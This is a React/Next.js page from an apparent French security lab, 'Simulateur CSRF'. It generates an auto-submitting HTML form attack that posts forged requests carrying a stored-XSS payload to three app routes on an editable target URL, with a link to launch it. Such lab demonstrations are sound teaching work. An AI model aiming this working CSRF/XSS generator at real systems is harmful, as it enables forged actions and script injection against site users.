"use client";

import { useState } from "react";

const defaultTarget = "http://localhost:3000";

export default function CsrfAttackerPage() {
  const [targetBase, setTargetBase] = useState(defaultTarget);
  const [payload, setPayload] = useState("<img src=x onerror=alert('csrf-xss')>");

  const target = targetBase.replace(/\/$/, "");

  const attackHtml = `<!doctype html>
<html>
  <body>
    <h2>Auto CSRF attack</h2>

    <form id="f1" action="${target}/api/contact" method="POST">
      <input type="hidden" name="name" value="CSRF Bot" />
      <input type="hidden" name="email" value="bot@attacker.local" />
      <input type="hidden" name="message" value="${payload.replace(/"/g, "&quot;")}" />
    </form>

    <form id="f2" action="${target}/api/reviews" method="POST">
      <input type="hidden" name="author" value="CSRF Bot" />
      <input type="hidden" name="content" value="${payload.replace(/"/g, "&quot;")}" />
    </form>

    <form id="f3" action="${target}/api/service-request" method="POST">
      <input type="hidden" name="client" value="CSRF Bot" />
      <input type="hidden" name="service" value="Commande forgee" />
      <input type="hidden" name="details" value="${payload.replace(/"/g, "&quot;")}" />
    </form>

    <script>
      document.getElementById("f1").submit();
      document.getElementById("f2").submit();
      document.getElementById("f3").submit();
    </script>
  </body>
</html>`;

  return (
    <main className="max-w-4xl mx-auto px-6 py-10 space-y-6">
      <h1 className="text-3xl font-extrabold">Simulateur CSRF (Labo)</h1>

      <p className="text-sm text-gray-600">
        Cette page genere un HTML d'attaque auto-submit qui envoie des POST vers les routes metier.
      </p>

      <div className="grid gap-3 rounded-xl border border-gray-200 p-4">
        <label className="text-sm font-semibold">Base URL cible</label>
        <input
          type="text"
          value={targetBase}
          onChange={(e) => setTargetBase(e.target.value)}
          className="w-full rounded-lg border border-gray-300 px-4 py-3"
          placeholder="http://localhost:3000"
        />

        <label className="text-sm font-semibold">Payload (XSS stockee)</label>
        <input
          type="text"
          value={payload}
          onChange={(e) => setPayload(e.target.value)}
          className="w-full rounded-lg border border-gray-300 px-4 py-3"
        />
      </div>

      <div className="flex flex-wrap gap-3">
        <a
          href={`data:text/html;charset=utf-8,${encodeURIComponent(attackHtml)}`}
          className="rounded-lg bg-black text-white px-5 py-3"
        >
          Lancer l'attaque (data URL)
        </a>

        <a
          href="/contact"
          className="rounded-lg border border-black px-5 py-3"
        >
          Ouvrir /contact pour verifier
        </a>
      </div>

      <pre className="whitespace-pre-wrap break-words rounded-xl border border-gray-200 p-4 text-xs bg-gray-50">
        {attackHtml}
      </pre>
    </main>
  );
}
